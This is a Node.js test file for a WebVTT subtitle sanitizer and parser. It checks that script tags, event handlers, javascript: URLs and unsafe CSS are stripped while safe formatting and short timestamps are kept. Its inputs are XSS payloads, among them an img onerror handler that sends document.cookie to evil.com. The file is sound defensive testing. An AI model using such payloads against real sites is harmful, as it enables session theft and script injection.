import { describe, it } from "node:test"
import assert from "node:assert/strict"
import { sanitizeCueText, parseVtt } from "../vtt"

describe("VTT / Subtitle Security & Sanitization", () => {
  it("strips script tags and executable contents", () => {
    const input = '<script>alert("XSS")</script>Hello World'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Hello World")
    assert.strictEqual(sanitized.includes("<script>"), false)
  })

  it("strips img onerror and event handlers", () => {
    const input = '<img src="x" onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">Watch this!'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Watch this!")
    assert.strictEqual(sanitized.includes("onerror"), false)
    assert.strictEqual(sanitized.includes("<img"), false)
  })

  it("strips event handlers inside allowed tags", () => {
    const input = '<b onclick="alert(1)" onmouseover="alert(2)">Bold Text</b>'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "<b>Bold Text</b>")
    assert.strictEqual(sanitized.includes("onclick"), false)
    assert.strictEqual(sanitized.includes("onmouseover"), false)
  })

  it("strips javascript href and link tags", () => {
    const input = '<a href="javascript:alert(1)">Click me</a>'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Click me")
  })

  it("strips iframe, embed, object, svg tags", () => {
    const input = '<iframe src="https://evil.com"></iframe><svg onload="alert(1)"></svg>Clean text'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "Clean text")
  })

  it("preserves legitimate subtitle formatting tags (b, i, u, s, em, strong)", () => {
    const input = "<i>Italic</i> <b>Bold</b> <u>Underline</u> <s>Strike</s> <strong>Strong</strong> <em>Em</em>"
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "<i>Italic</i> <b>Bold</b> <u>Underline</u> <s>Strike</s> <strong>Strong</strong> <em>Em</em>")
  })

  it("preserves safe font color and span style/class attributes", () => {
    const input = '<font color="#ff0000">Red text</font> and <span style="color: #00ff00">Green</span> <span class="speaker">Narrator</span>'
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, '<font color="#ff0000">Red text</font> and <span style="color: #00ff00">Green</span> <span class="speaker">Narrator</span>')
  })

  it("strips malicious CSS expressions or javascript URLs in font/span attributes", () => {
    const maliciousFont = '<font color="javascript:alert(1)">Text</font>'
    assert.strictEqual(sanitizeCueText(maliciousFont), "<font>Text</font>")

    // The unsafe background declaration is dropped, the safe color survives
    const maliciousSpan = '<span style="background: url(javascript:alert(1)); color: red">Styled</span>'
    assert.strictEqual(sanitizeCueText(maliciousSpan), '<span style="color: red">Styled</span>')

    const cssExpression = '<span style="color: expression(alert(1))">Styled</span>'
    assert.strictEqual(sanitizeCueText(cssExpression), "<span>Styled</span>")
  })

  it("preserves multi-property safe styles regardless of declaration order", () => {
    const input = '<span style="background-color: rgba(0,0,0,0.65); color: #fff">Hello</span> <span style="font-size: 18px; color: red">World</span> <span style="text-shadow: 2px 2px 0 #000; font-family: Arial">Dark</span>'
    assert.strictEqual(
      sanitizeCueText(input),
      '<span style="background-color: rgba(0,0,0,0.65); color: #fff">Hello</span> <span style="font-size: 18px; color: red">World</span> <span style="text-shadow: 2px 2px 0 #000; font-family: Arial">Dark</span>'
    )
  })

  it("drops invalid style declarations individually and rejects quote/url tricks", () => {
    const quotedFamily = '<span style="font-family: \'Times New Roman\'">Quoted</span>'
    assert.strictEqual(sanitizeCueText(quotedFamily), "<span>Quoted</span>")

    const unclosedQuote = '<span style="font-family: \\"x">Injected</span>'
    assert.strictEqual(sanitizeCueText(unclosedQuote), "<span>Injected</span>")

    const fontUrl = '<span style="font-family: url(x); color: #fff">T</span>'
    assert.strictEqual(sanitizeCueText(fontUrl), '<span style="color: #fff">T</span>')

    const position = '<span style="position: fixed; color: red">P</span>'
    assert.strictEqual(sanitizeCueText(position), '<span style="color: red">P</span>')
  })

  it("combines safe style and class attributes on the same span", () => {
    const input = '<span style="color: #ff0000" class="speaker">A</span>'
    assert.strictEqual(sanitizeCueText(input), '<span style="color: #ff0000" class="speaker">A</span>')
  })

  it("auto-closes open tags safely", () => {
    const input = "<b>Bold without close"
    const sanitized = sanitizeCueText(input)
    assert.strictEqual(sanitized, "<b>Bold without close</b>")
  })

  it("parses WebVTT file with XSS payloads safely", () => {
    const vtt = `WEBVTT

00:00:01.000 --> 00:00:04.000
<script>alert('XSS')</script><b>Hello</b> <img src=x onerror=alert(1)>world!`

    const cues = parseVtt(vtt)
    assert.strictEqual(cues.length, 1)
    assert.strictEqual(cues[0].text, "<b>Hello</b> world!")
  })

  it("parses short timestamps (MM:SS.mmm, hours optional) without dropping cues", () => {
    const vtt = `WEBVTT

00:05.000 --> 00:08.500
Short timestamp cue

00:01:05.000 --> 00:01:08.000
Full timestamp cue

0:30.000 --> 0:31.250
Single-digit minute cue`

    const cues = parseVtt(vtt)
    assert.strictEqual(cues.length, 3)
    assert.strictEqual(cues[0].start, 5)
    assert.strictEqual(cues[0].end, 8.5)
    assert.strictEqual(cues[0].text, "Short timestamp cue")
    assert.strictEqual(cues[1].start, 30)
    assert.strictEqual(cues[1].end, 31.25)
    assert.strictEqual(cues[2].start, 65)
    assert.strictEqual(cues[2].end, 68)
  })
})
